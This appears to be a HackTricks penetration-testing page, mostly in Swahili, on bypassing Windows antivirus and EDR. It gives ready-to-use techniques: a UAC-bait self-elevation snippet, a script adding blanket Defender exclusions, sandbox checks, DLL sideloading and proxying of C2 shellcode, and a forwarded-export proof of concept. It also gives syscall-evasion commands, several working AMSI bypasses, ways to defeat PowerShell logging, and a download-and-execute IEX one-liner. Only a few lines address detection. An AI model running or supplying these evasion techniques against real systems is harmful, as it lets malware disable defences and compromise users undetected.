# Kupitisha Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zuia Defender

- [defendnot](https://github.com/es3n1n/defendnot): Chombo cha kuzuia Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Chombo cha kuzuia Windows Defender kufanya kazi kwa kuigiza AV nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Mbinu ya installer kama bait ya UAC kabla ya kuingilia Defender

Loaders za umma zinazojificha kama cheats za michezo mara nyingi huwasilishwa kama installers zisizotia saini za Node.js/Nexe ambazo kwanza **ask the user for elevation** na kisha tu huzima Defender. Mtiririko ni rahisi:

1. Chunguza muktadha wa admin kwa kutumia `net session`. Amri hiyo hufanikiwa tu wakati mwito una haki za admin, hivyo kushindwa kunaonyesha loader inafanya kazi kama mtumiaji wa kawaida.
2. Mara moja ijirudishe tena kwa kitenzi `RunAs` ili kusababisha onyo la idhini la UAC linalotarajiwa huku ikihifadhi mstari wa amri wa awali.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Waathiriwa tayari wanaamini wanakusakinisha programu “cracked”, hivyo ombi la uthibitisho kwa kawaida linakubaliwa, likimpa malware haki zinazohitajika kubadilisha sera ya Defender.

### Uteuzi wa jumla za `MpPreference` kwa kila herufi ya diski

Mara tu imepata ruhusa za juu, minyororo za mtindo wa GachiLoader huboresha maeneo yasiyoonekana ya Defender badala ya kuzima huduma kabisa. Loader kwanza inaua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha inasukuma **utoaji wa kutengwa uliopanuka sana** ili kila profile ya mtumiaji, saraka ya mfumo, na diski inayoweza kuondolewa viwe visivyoweza kuchunguzwa:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—washambuliaji wanahifadhi chaguo la kupakia unsigned drivers baadaye bila kugusa Defender tena.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ikiruhusu hatua za baadaye kuthibitisha kuwa exclusions zinadumu au kuziwekea zaidi bila kusababisha UAC tena.

Kwa sababu hakuna huduma ya Defender iliyokatishwa, ukaguzi wa afya wa msingi unaendelea kuripoti “antivirus active” ingawa uchunguzi wa real-time hauwahi kugusa njia hizo.

## **AV Evasion Methodology**

Kwa sasa, AVs hutumia mbinu tofauti za kuamua kama faili ni hatari au la, kama static detection, dynamic analysis, na kwa EDRs za juu zaidi, behavioural analysis.

### **Static detection**

Static detection hupatikana kwa kutambua strings au arrays za bytes zilizojulikana kuwa hatari katika binary au script, na pia kwa kutoa taarifa kutoka kwenye faili yenyewe (mfano: file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kwamba kutumia public tools zinazojulikana kunaweza kukufanya uonekane kwa urahisi zaidi, kwani huenda zimekwishachambuliwa na kutajwa kama hatari. Kuna njia chache za kuepuka aina hii ya uchunguzi:

- **Encryption**

Ikiwa utaficha binary kwa encryption, AV haitakuwa na njia ya kugundua program yako, lakini utahitaji aina fulani ya loader ili ku-decrypt na kuendesha program hiyo ndani ya memory.

- **Obfuscation**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya strings katika binary au script yako ili kupita AV, lakini hili linaweza kuchukua muda kulingana na unachojaribu obfuscate.

- **Custom tooling**

Ikiwa utatengeneza zana zako mwenyewe, haitakuwa na signatures mbaya zinazojulikana, lakini hii inachukua muda na jitihada nyingi.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Ninapendekeza ukague playlist hii ya YouTube: https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf kuhusu AV Evasion ya vitendo.

### **Dynamic analysis**

Dynamic analysis ni wakati AV inakimbia binary yako ndani ya sandbox na inatazama shughuli hatarishi (mfano: kujaribu ku-decrypt na kusoma nywila za browser, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo unaweza kufanya ili kuepuka sandboxes.

- **Sleep before execution** Kutegemea jinsi imetekelezwa, inaweza kuwa njia nzuri ya kupita dynamic analysis ya AV. AV zina muda mfupi wa kuchambua faili ili zisivurugue mtiririko wa kazi wa mtumiaji, hivyo kutumia sleeps ndefu kunaweza kuvuruga uchambuzi wa binaries. Tatizo ni kwamba sandboxes nyingi zinaweza kuruka sleep kulingana na jinsi ime implemente.
- **Checking machine's resources** Kawaida Sandboxes zina rasilimali chache (mfano: < 2GB RAM), vinginevyo zingekuwa zikiletea mtumiaji taratibu. Unaweza kuwa mbunifu hapa, kwa mfano kuangalia joto la CPU au hata kasi za fan; si kila kitu kitatekelezwa ndani ya sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imejiunga na domain ya "contoso.local", unaweza kuangalia domain ya kompyuta kuona kama inalingana na ile uliyoainisha; ikiwa haifanyi, unaweza kufanya program yako itoke.

Inaonekana kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH, hivyo unaweza kuangalia computer name katika malware yako kabla ya detonation; ikiwa jina linalingana na HAL9TH, ina maana uko ndani ya defender's sandbox, kwa hivyo unaweza kuifanya program yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Mikakati nyingine nzuri kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kwa kupigana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema awali kwenye chapisho hili, **public tools** hatimaye zitakuwa **get detected**, kwa hivyo unapaswa jiulize jambo fulani:

Kwa mfano, ikiwa unataka dump LSASS, **do you really need to use mimikatz**? Au unaweza kutumia project tofauti ambayo haijulikani sana na pia inadump LSASS.

Jibu sahihi huenda likawa la mwisho. Kuchukua mimikatz kama mfano, ni labda moja ya, ikiwa sio kifaa kilichotajwa mara nyingi zaidi na AVs na EDRs; ingawa project yenyewe ni nzuri, ni pia tabu kuifanya iweze kupita AVs, kwa hivyo tafuta mbadala kwa kile unacholenga kufanya.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. Ikiwa unataka kuangalia kama payload yako inagunduliwa na AV fulani, install AV hiyo kwenye VM, jaribu kuzima automatic sample submission, na iteste pale hadi utakapofurahi na matokeo.

## EXEs vs DLLs

Wakati wowote inapowezekana, daima **prioritize using DLLs for evasion**, kwa uzoefu wangu, faili za DLL kwa kawaida huwa **way less detected** na kuchambuliwa, hivyo ni mbinu rahisi kutumia kuepuka detection katika baadhi ya kesi (ikiwa payload yako ina njia ya kukimbia kama DLL bila shaka).

Kama tunaona katika picha hii, DLL Payload kutoka kwa Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha baadhi ya tricks unaweza kutumia na faili za DLL ili uwe muchache kuonekana zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inachukua faida ya DLL search order inayotumiwa na loader kwa kuweka programu ya mhanga na malicious payload(s) kando kwa kando.

Unaweza kukagua programu zinazoathirika na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programu zinazoweza kushambuliwa kwa DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu za DLL Hijackable/Sideloadable**, mbinu hii ni ya kimya ikiwa inafanywa ipasavyo, lakini ukitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kukamatwa kwa urahisi.

Kwa kuweka tu malicious DLL yenye jina ambalo programu inatarajia kupakia, haitapakia payload yako, kwa sababu programu inatarajia baadhi ya kazi maalum ndani ya DLL hiyo; kutatua tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inapeleka miito ambayo programu inafanya kutoka kwa proxy (na malicious) DLL kwenda kwa DLL ya asili, hivyo kuhifadhi utendakazi wa programu na kuruhusu kushughulikia utekelezaji wa payload yako.

Nitakuwa nikitumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ni hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupa faili 2: DLL source code template, na DLL ya asili iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Haya ndizo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zote mbili, shellcode yetu (iliyofichwa na [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina kiwango cha utambuzi 0/26 kwenye [antiscan.me](https://antiscan.me)! Ningesema hilo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza sana uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu tulichojadili kwa undani zaidi.

### Abusing Forwarded Exports (ForwardSideLoading)

Modules za Windows PE zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, entry ya export ina string ya ASCII ya aina `TargetDll.TargetFunc`. Wakati caller anapotatua export, Windows loader itafanya:

- Itapakia `TargetDll` ikiwa bado halijapakiwa
- Itatambua `TargetFunc` kutoka kwake

Tabia kuu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hupelekwa kutoka kwenye namespace ya kulindwa ya KnownDLLs (mfano, ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` si KnownDLL, utaratibu wa kawaida wa utafutaji wa DLL unatumiwa, ambao unajumuisha saraka ya moduli inayofanya kutatua forward.

Hii inaruhusu primitive isiyo ya moja kwa moja ya sideloading: pata DLL iliyosigned inayotoa export ya function iliyo-forwarded kwa jina la module lisilo-KnownDLL, kisha weka pamoja DLL hiyo iliyosigned na DLL inayodhibitiwa na mshambuliaji iliyopewa jina hasa kama module ya target iliyoforward. Wakati export iliyoforward inapoitwa, loader itatatua forward na itapakia DLL yako kutoka saraka ile ile, ikitekeleza DllMain yako.

Mfano ulioonekana kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` sio KnownDLL, hivyo inatatuliwa kupitia mpangilio wa utafutaji wa kawaida.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyosainiwa kwenye saraka inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` haribifu katika folda hiyo hiyo. DllMain ndogo inatosha kupata code execution; huna haja ya kutekeleza forwarded function ili kuamsha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Chochea kupeleka kwa LOLBin iliyotiwa saini:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) inapakia side-by-side `keyiso.dll` (signed)
- Wakati ikitatua `KeyIsoSetAuditingInterface`, loader inafuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader inapakia `NCRYPTPROV.dll` kutoka `C:\test` na inatekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata kosa la "missing API" tu baada ya `DllMain` kuendesha

Hunting tips:
- Lenga forwarded exports ambapo module lengwa si KnownDLL. KnownDLLs zimetajwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Angalia orodha ya forwarder ya Windows 11 kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Mawazo ya utambuzi/ulinzi:
- Angalia LOLBins (e.g., rundll32.exe) zikikipakia DLL zilizosainiwa kutoka njia zisizo za mfumo, na baadaye zikikipakia non-KnownDLLs zenye jina la msingi sawa kutoka saraka hiyo
- Taarifu kuhusu mnyororo wa mchakato/moduli kama: `rundll32.exe` → zisizo za mfumo `keyiso.dll` → `NCRYPTPROV.dll` chini ya njia zinazoweza kuandikwa na mtumiaji
- Tekeleza sera za uadilifu wa msimbo (WDAC/AppLocker) na zuia write+execute katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya kuficha.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kile kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee zana moja tu — ikiwa inawezekana, jaribu kuunganisha mbinu mbalimbali za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs often place **user-mode inline hooks** on `ntdll.dll` syscall stubs. Ili kupitisha hooks hizo, unaweza kuunda stub za syscall **direct** au **indirect** ambazo zinapakia **SSN** (System Service Number) sahihi na kuhamia kernel mode bila kutekeleza hooked export entrypoint.

**Invocation options:**
- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI iliumbwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzoni, AV zilikuwa zinaweza tu kuchunguza **faili kwenye diski**, hivyo kama ungefanya kwa namna fulani kutekeleza payloads **directly in-memory**, AV haingeweza kufanya chochote kuzuia, kwa kuwa haikuwa na uonekano wa kutosha.

Kipengele cha AMSI kimeingizwa katika vipengele hivi vya Windows.

- User Account Control, au UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Inaruhusu suluhisho za antivirus kuchunguza tabia za script kwa kufunua yaliyomo ya script kwa namna ambayo hayajasimbwa na hayajaobfuscated.

Kukimbia `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutaonyesha tahadhari ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Tambua jinsi inavyoweka mstari wa mbele `amsi:` kisha njia kwenda kwa executable iliyotumika kuendesha script, katika kesi hii, powershell.exe

Hatukuweka faili yoyote kwenye diski, lakini bado tulikamatwa while in-memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia na **.NET 4.8**, msimbo wa C# unakandamizwa kupitia AMSI pia. Hii hata inaathiri `Assembly.Load(byte[])` kwa kusababisha execution in-memory. Ndiyo maana kutumia toleo la chini la .NET (kama 4.7.2 au chini) kunapendekezwa kwa execution in-memory ikiwa unataka kuepuka AMSI.

Kuna njia chache za kuzunguka AMSI:

- **Obfuscation**

Kwa kuwa AMSI hasa hufanya kazi na static detections, kubadilisha scripts unazojaribu kupakia inaweza kuwa njia nzuri ya kuepuka utambuzi.

Hata hivyo, AMSI ina uwezo wa ku-unobfuscate scripts hata kama ziko na tabaka nyingi, hivyo obfuscation inaweza kuwa si chaguo zuri kulingana na jinsi inavyofanywa. Hii inafanya kuwa si rahisi kuepuka. Ingawa, wakati mwingine, kila unachohitaji ni kubadilisha majina ya vigezo vitfew na utakuwa sawa, hivyo inategemea ni kiasi gani kitu kimeorodheshwa.

- **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kupakia DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuharibu au kubadilisha kwa urahisi hata ukiendesha kama mtumiaji asiye na haki za juu. Kutokana na hitilafu hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kuepuka skanning ya AMSI.

**Forcing an Error**

Kulazimisha initialization ya AMSI kushindwa (amsiInitFailed) kutasababisha kutakuwa na skani yoyote iliyotangazwa kwa mchakato wa sasa. Hii ilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeendeleza signature ili kuzuia matumizi mapana.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua tu mstari mmoja wa msimbo wa powershell kufanya AMSI isitumike kwa mchakato wa sasa wa powershell. Mstari huu bila shaka ulibainishwa na AMSI yenyewe, hivyo marekebisho fulani yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyochukua kutoka kwa [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Inafanya kazi kwenye PowerShell, WScript/CScript na custom loaders pia (kila kitu ambacho vinginevyo kingepakia AMSI).
- Tumia pamoja na kupeleka scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka viashiria virefu vya mstari wa amri.
- Imeonekana ikitumika na loaders zinazoendeshwa kupitia LOLBins (mfano, `regsvr32` inayoita `DllRegisterServer`).

Zana **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia inazalisha script za kupita AMSI.
Zana **[https://amsibypass.com/](https://amsibypass.com/)** pia inazalisha script za kupita AMSI ambazo zinaepuka saini kwa kubadilisha kwa nasibu user-defined functions, variables, expressions za characters na kutumia casing ya herufi kwa nasibu kwa PowerShell keywords ili kuepuka saini.

**Ondoa saini iliyogunduliwa**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyogunduliwa kutoka kwenye kumbukumbu ya process ya sasa. Zana hizi zinafanya kazi kwa kuchambua kumbukumbu ya process ya sasa kutafuta saini ya AMSI kisha kuibadilisha kwa NOP instructions, kwa ufanisi kuiondoa kwenye kumbukumbu.

**AV/EDR products that uses AMSI**

Unaweza kupata orodha ya AV/EDR products zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell version 2**
Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuruhusu kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa ukaguzi na kutatua matatizo, lakini pia inaweza kuwa tatizo kwa wadukuzi wanaotaka kuepuka kugunduliwa.

To bypass PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha session ya PowerShell isiyodhibitiwa bila kinga (hii ndicho `powerpick` kutoka Cobal Strike hutumia).


## Obfuscation

> [!TIP]
> Mbinu mbalimbali za obfuscation zinategemea encrypting data, ambayo itaongeza entropy ya binary na kufanya AVs na EDRs ziweze kuigundua kwa urahisi. Kuwa mwangalifu na hili na pengine tumia encryption tu kwa sehemu maalum za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua ConfuserEx 2 profile
• de4dot itakuwa inatoa control-flow flattening, kurejesha namespaces, classes na variable names za asili na ku-decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **bila** kuhitaji kuendesha sampuli yenye madhara – yenye msaada wakati unafanya kazi kwenye workstation isiyokuwa mtandaoni.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya [LLVM](http://www.llvm.org/) compilation suite inayoweza kuongeza usalama wa programu kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia `C++11/14` language kuzalisha, wakati wa compile, obfuscated code bila kutumia kifaa chochote cha nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Inaongeza tabaka la obfuscated operations zinazozalishwa na C++ template metaprogramming framework ambazo zitaifanya maisha ya mtu anayetamani ku-crack application kuwa mgumu kidogo.
